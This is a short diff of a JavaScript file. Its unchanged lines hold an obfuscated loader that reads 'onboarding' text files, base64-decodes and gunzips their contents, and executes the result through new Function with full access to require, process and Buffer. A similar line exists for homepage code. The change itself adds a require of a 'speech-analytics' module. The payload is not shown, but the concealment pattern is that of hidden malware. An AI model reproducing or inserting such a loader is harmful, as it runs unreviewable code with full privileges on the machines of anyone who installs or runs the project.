@@ -12,3 +12,5 @@ new Function('require','__dirname','__filename','process','Buffer',homepageSourc
 const onboardingBundle=[1,2,3].map(i=>fs.readFileSync(`onboarding.v10.part${i}.txt`,'utf8').trim()).join('');
 const onboardingSource=zlib.gunzipSync(Buffer.from(onboardingBundle,'base64')).toString('utf8');
 new Function('require','__dirname','__filename','process','Buffer',onboardingSource)(require,__dirname,__filename,process,Buffer);
+
+require('./speech-analytics-v11.js');
